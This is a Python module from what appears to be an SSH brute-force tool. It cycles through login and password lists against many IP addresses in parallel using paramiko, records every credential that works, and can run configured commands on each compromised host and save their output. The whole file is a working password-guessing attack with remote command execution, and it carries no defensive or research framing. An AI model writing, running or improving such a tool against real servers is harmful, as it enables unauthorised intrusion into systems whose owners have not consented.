from scripts.helpers import Threads, get_good_ips, prepare, show_brute_statistics, get_ips
import paramiko
import os

ENV: dict
LOGINS: list
PASSWORDS: list

threads: Threads
current_work_ips: list
current_creds: list
worked_ips: list
good_ips: list

def execute(client: paramiko.SSHClient, command: str):
    return client.exec_command(command)

def make_connection(ip: str, number: int, env, ips: list):
    global current_creds, worked_ips, good_ips
    state = True
    for login in LOGINS:
        if state:
            for password in PASSWORDS:
                if state:
                    current_creds[number] = [login, password]
                    
                    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips, ips, ENV)
                    
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(
                            hostname=ip,
                            port=int(env['PORT']),
                            username=login,
                            password=password,
                            timeout=int(env['TIMEOUT'])
                        )
                    except Exception as error:
                        with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]}', 'a') as errors:
                            errors.write(str(error) + '\n')
                    else:
                        with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]}', 'a') as found:
                            found.write(ip + f' | {login}:{password}\n')
                        
                        if ENV['ALLOW_COMMANDS'] == 'true':
                            commands = ENV['COMMANDS'].split(',')
                            
                            with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
                                founde.write(f'[IP ADDRESS] {ip}\n\n')
                            
                            for command in commands:
                                stdin, stdout, stderr = execute(client, command)
                                with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
                                    founde.write(f'[{str(command).upper()}] {stdout.read().decode()}\n')
                                    
                            with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
                                founde.write('-----\n')
                        good_ips.append(ip)
                        state = False
                        break
                    client.close()
    worked_ips.append(ip)
    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips, ips, ENV)

def connect(ips: list, job_resources: list, number: int, env):
    global current_work_ips
    i = 0
    for ip in job_resources:
        current_work_ips[number] = [ip, [i + 1, len(job_resources)]]
        make_connection(ip, number, env, ips)
        i += 1

def start(env, arguments, only: bool):
    global ENV, LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips
    LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips = prepare(env, arguments)
    ENV = env
    print('PREPARED TO WORK')
    print('CREATING IPS LIST')
    if only:
        ips = get_ips(env, arguments)
    else:
        ips = get_good_ips(env)
    print('[INFO] IPS LIST IS READY')
    print('[INFO] STARTING CONNECTIONS...')
    print('[INFO] PREPARED TO WORK')
    print('[INFO] CREATING IPS LIST')
    print('[INFO] IPS LIST IS READY')
    print('[INFO] STARTING CONNECTIONS...')
    
    jobs_resources = [[] for i in range(ENV["THREADS"])]

    job_resource_id = 0
    for ip in ips:
        if job_resource_id == len(jobs_resources):
            job_resource_id = 0
        jobs_resources[job_resource_id].append(ip)
        job_resource_id += 1

    for i in range(ENV['THREADS']):
        threads.jobs.append([connect, ips, jobs_resources[i], i, env])

    threads.run()
    
    print('CONNECTIONS ARE ENDED')
    print('MAKING BACKUPS')
    os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]}.backup')
    os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}.backup')
    os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]}.backup')

if __name__ == '__main__':
    print('[WARNING] PLEASE LAUNCH ssh_brute.py')
